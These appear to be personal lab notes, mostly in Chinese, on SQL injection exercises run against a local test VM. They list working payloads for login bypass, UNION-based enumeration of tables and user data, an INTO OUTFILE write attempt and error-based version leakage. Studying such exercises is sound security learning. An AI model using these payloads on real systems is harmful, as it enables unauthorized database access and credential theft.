# SQL injections

## Example 1
`cqq' or 1=1 --`不行,难道只能用#来注释掉后面的语句吗？
哦不是，--也可以，只是要多一个空格
即`cqq' or 1=1 -- ` ，这样就可以注释掉后面的password字段的语句，就不会造成错误了。

`cqq' or 1=1 #`也可以。

## Example 2
`cqq' or 1=1 limit 1#`
为什么要用limit? 
这样使MySQL值传回第一行数据
参考：http://wiki.jikexueyuan.com/project/sql/top-clause.html
MySQL 支持 LIMIT 子句，用以取回有限数量的记录，而 Oracle 则使用 ROWNUM 子句来实现这一功能。
在MySQL中`SELECT * FROM CUSTOMERS LIMIT 3;`相当于在Oracle中`SELECT TOP 3 * FROM CUSTOMERS;`

## Example 3
这题会过滤单引号，于是在username字段上填`\`，刚好可以把sql语句中夹在username的值之间的两个单引号中后面那个注释掉，
然后在password字段中填写`or 1=1 #`，变成
`SELECT * FROM users WHERE username = '\' AND password = 'or 1=1 #'`
这样`\`后面的单引号就被转义了，而`\' AND password =`整个变成了username的值，然后用or 1=1满足逻辑判断，再用#注释掉后面剩下的单引号

## Example 4
-> In this example, the developer puts part of the query directly in a parameter. It's really rare in traditional web applications but can sometimes be found in web services, especially for mobile applications. You are injecting directly in the `WHERE` statement and can manipulate the request to retrieve anything you want.

由它给出的url http://192.168.170.131/sqlinjection/example4/?req=username='hacker'
`http://192.168.170.131/sqlinjection/example4/?req=username='' UNION SELECT version(),current_user(),3 #`
得到如下：
```
id	name
5.1.66-0+squeeze1	pentesterlab@localhost
```
![](img/屏幕快照\ 2017-03-31\ 下午8.16.23.png)

然后查询`table_schema`，</br>
`http://192.168.170.131/sqlinjection/example4/?req=username='' UNION SELECT table_schema,2,3 FROM information_schema.tables WHERE table_schema !='mysql' AND table_schema != 'information_schema'#`
得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午8.35.48.png)
而在我自己的ubuntu-14.04-server中得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午8.34.13.png)
然后查询`table_name`，</br>
`http://192.168.170.131/sqlinjection/example4/?req=username='' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema !='mysql' AND table_schema != 'information_schema'#`
得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午8.38.27.png)
即有`users`, `infos`, `companies`这些表。
然后查询`column_name` </br>
`http://192.168.170.131/sqlinjection/example4/?req=username='' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' #`
然而并没有成功。</br>
![](img/屏幕快照\ 2017-03-31\ 下午9.00.00.png)
然后查询所有使用者 </br>
`http://192.168.170.131/sqlinjection/example4/?req=username='' UNION SELECT id,username,3 FROM users`
得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午8.58.04.png)

## Example 5
`http://192.168.170.131/sqlinjection/example5/?limit=3 INTO OUTFILE '/home/pentesterlab/test' #`
尝试将sql查询结果写入文件
![](img/屏幕快照\ 2017-03-31\ 下午9.06.29.png)
发现没有写入权限

## Example 6
打开一看，发现url是这个
`http://192.168.170.131/sqlinjection/example6/?group=username`
然后发现有错误 </br>
![](img/屏幕快照\ 2017-03-31\ 下午9.08.38.png)
于是将`username`改成`id` </br>
即 `http://192.168.170.131/sqlinjection/example6/?group=id` 得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午9.10.59.png)
发现注入点为`GROUP BY`的参数，于是依然`UNION SELECT` </br>
`http://192.168.170.131/sqlinjection/example6/?group=id UNION SELECT version(),current_user(),3 #`
得到 </br>
![](img/屏幕快照\ 2017-03-31\ 下午9.15.19.png)

## Examle 7
`http://192.168.170.131/sqlinjection/example7/?id=1%20UNION%20SELECT%20extractvalue(%27%3Cxml%3E%27,concat(%22/%22,(select%20version())))`
回传了版本号
```
Mysql2::Error: XPATH syntax error: '5.1.66-0+squeeze1': SELECT * FROM users WHERE id=1 UNION SELECT extractvalue('<xml>',concat("/",(select version()))) 
```

## Examle 8
进入Example 8，直接url为`http://192.168.170.131/sqlinjection/example8/`.
然后看到一个`Internal Server Error`.
![](img/屏幕快照\ 2017-04-02\ 下午1.27.19.png)
然后官网说要先建立一个用户，然而我找不到在哪里注入。
